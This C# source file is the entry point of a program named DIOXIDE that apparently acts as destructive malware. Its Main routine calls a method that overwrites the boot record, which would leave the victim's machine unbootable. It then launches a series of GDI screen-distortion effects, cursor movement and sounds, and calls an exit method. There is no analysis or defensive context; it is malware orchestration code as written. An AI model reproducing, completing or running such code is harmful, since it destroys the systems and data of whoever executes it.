using System.Threading;
using System.Threading.Tasks;
using System;
using System.Runtime.InteropServices;
using System.IO;

namespace DIOXIDE
{
    class Program
    {
        public static void Main()
        {
            execute();
        }
        public static void execute()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            payloads.CreateWaveFile();
            destruction.OverwriteBoot();

            Thread.Sleep(5000);

            run_payloads();

            destruction.Exit();
        }
        private static void run_payloads()
        {
            int True = 1;

            payloads payloads = new payloads();

            Task.Run(payloads.cursor_movement);

            Task.Run(payloads.gdi1);
            payloads.Sound1();
            payloads.gdi1_cancel = True;

            Task.Run(payloads.gdi2);
            payloads.Sound2();
            payloads.gdi2_cancel = True;

            Task.Run(payloads.gdi3);
            payloads.Sound3();
            payloads.gdi3_cancel = True;

            Task.Run(payloads.gdi2);
            Task.Run(payloads.gdi3);
            payloads.Sound4();
            payloads.gdi2_cancel = True;
            payloads.gdi3_cancel = True;

            Task.Run(payloads.gdi4);
            payloads.Sound5();
            payloads.gdi4_cancel = True;

            Task.Run(payloads.gdi5);
            payloads.Sound6();
            payloads.gdi5_cancel = True;

            return;
        }
    }
}